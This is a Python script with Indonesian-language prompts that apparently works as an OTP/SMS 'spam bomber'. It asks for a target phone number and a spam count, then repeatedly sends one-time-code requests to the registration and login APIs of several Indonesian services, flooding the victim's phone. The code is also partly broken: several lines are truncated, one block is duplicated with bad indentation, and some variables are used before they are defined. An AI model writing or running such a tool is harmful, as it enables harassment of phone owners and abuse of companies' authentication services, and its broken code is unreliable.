try:
    import os,sys,time,requests,json,random
    from colorama import Fore,Back,init
except ModuleNotFoundError:
    print(f"{W}[{R}!{W}] Module Tidak Tersedia{abu}...")
    time.sleep(5)
    print(f"{W}[{R}!{W}] Type{R}:{Y}pip{W} install colorama requests")

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def mr_wibu():
    mr_tytyd = input(f"{W}Replay? {biru}({W}y{Y}/{W}n{biru}){R}:{G} ")
    if mr_tytyd=="y" or mr_tytyd=="Y":
        time.sleep(5)
        put()
    if mr_tytyd=="n" or mr_tytyd=="N":
        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}....{W}")
        time.sleep(5)

def logo_taekyung():
    try:
        mr_ip=requests.get('https://api.ipify.org').text
        mr_time=time.asctime(time.localtime(time.time()))
        os.system("clear")
        time.sleep(5)
        os.system("clear")
        print(f""" \033[1;96m███╗   ███╗██╗███╗   ██╗██╗   ██╗███████╗         ██████╗██████╗  █████>
 ████╗ ████║██║████╗  ██║██║   ██║██╔════╝        ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝ | |
 ██╔████╔██║██║██╔██╗ ██║██║   ██║███████╗        ██║     ██████╔╝███████║██║     █████╔╝  | |
 ██║╚██╔╝██║██║██║╚██╗██║██║   ██║╚════██║        ██║     ██╔══██╗██╔══██║██║     ██╔═██╗  | |
 ██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝███████║        ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗ | |
 ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ | |
 __________________________________________________________________________________________| |
 ____________________________________________________________________________________________|

 \033[1;93m _________________________________________________________________________________
 |                                                                                 |
 |      CREATOR   : RIZKY                                                          |
 |                                                                                 |
 |      LAPOR BUG : +6289653304040                                                 |
 |_________________________________________________________________________________|""")


    except requests.exceptions.ConnectionError:
        sys.exit(f"{W}[{R}!{W}] Koneksi Eror Silakan Cek Jaringan Anda{abu}....{abu}")
    except KeyboardInterrupt:
        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}...{W}")


def put():
    logo_taekyung()
    try:
        mr_ua=random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, lik>
        mr_ip=requests.get('https://api.ipify.org').text


        mr_ammar=input(f"{W}[{biru}?{W}] Nomor Target {biru}(Ex{R}:{W}8xx{biru}) {R}»{Y}⟩{W} ")
        power_python=int(input(f"{W}[{biru}?{W}] Total Spam {R}»{Y}⟩{W} "))
        print ("")
        for i in range(int(power_python)):
            time.sleep(8)
            dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number>
            if "ok" in dekor2:
                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_ammar}")
            else:
                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_ammar}")
            time.sleep(8)
dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number>
            if "ok" in dekor2:
                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_ammar}")
            else:
                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_ammar}")
            time.sleep(8)
            lummo={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; An>
            gas=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNum>
            gaskeun=requests.post("https://api.tokko.io/graphql",headers=lummo,data=gas).text
            if "erors" in gaskeun:
                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_ammar}")
            else:
                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_ammar}")
            time.sleep(8)
            AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps>
            if "PENDING" in AmmarGamteng:
                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_ammar}")
            else:
                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_ammar}{W}")
        mr_wibu()
    except requests.exceptions.ConnectionError:
        sys.exit(f"{W}[{R}!{W}] Koneksi Eror Silakan Cek Jaringan Anda{abu}....{abu}")
    except KeyboardInterrupt:
        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}...{W}")
    except ValueError:
        sys.exit(f"{W}[{Y}!{W}] Masukkan Dengan Benar Kak{abu}.....")


if __name__=='__main__':
    put()
